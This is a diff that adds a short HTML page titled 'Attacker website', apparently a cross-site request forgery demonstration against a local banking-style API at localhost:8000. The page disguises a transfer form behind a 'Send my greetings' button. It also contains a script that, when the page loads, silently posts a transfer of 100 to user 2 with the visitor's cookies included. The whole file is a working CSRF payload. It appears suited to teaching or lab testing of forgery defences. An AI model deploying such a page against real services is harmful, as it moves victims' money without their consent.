@@ -1,0 +1,26 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Title</title>
+</head>
+<body>
+    <h1> Attacker website </h1>
+    <form action="http://localhost:8000/api/transactions/" method="POST">
+        <input name="receiver_user" value="2">
+        <input name="amount" value="100">
+        <button type="submit">Send my greetings</button>
+    </form>
+    <script>
+        const formData = new FormData();
+        formData.append('receiver_user', '2')
+        formData.append('amount', '100')
+        fetch('http://localhost:8000/api/transactions/', {
+            method: 'POST',
+            mode: 'cors',
+            body: formData,
+            credentials: 'include', // include, *same-origin, omit
+        })
+    </script>
+</body>
+</html>
